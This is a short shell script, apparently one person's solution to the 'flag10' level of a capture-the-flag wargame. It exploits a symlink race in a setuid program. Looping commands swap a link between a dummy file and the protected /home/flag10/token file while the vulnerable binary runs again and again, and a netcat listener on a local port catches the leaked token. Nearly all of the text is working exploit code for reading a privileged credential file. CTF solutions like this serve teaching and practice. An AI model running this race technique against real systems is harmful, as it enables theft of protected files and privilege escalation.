# Solution by Farzad E. (me@dNetGuru.com)  / @dNetGuru

touch ~/blah
while :; do nc -l 18211 >> ~/o; done &
while :; do ln -fs ~/blah ~/dnet; ln -fs /home/flag10/token ~/dnet; done &
while :; do nice -n 20 /home/flag10/flag10 ~/dnet 127.0.2.127 >/dev/null; done &
sleep 5
tail ~/o | grep -v '.oO Oo.' # Header !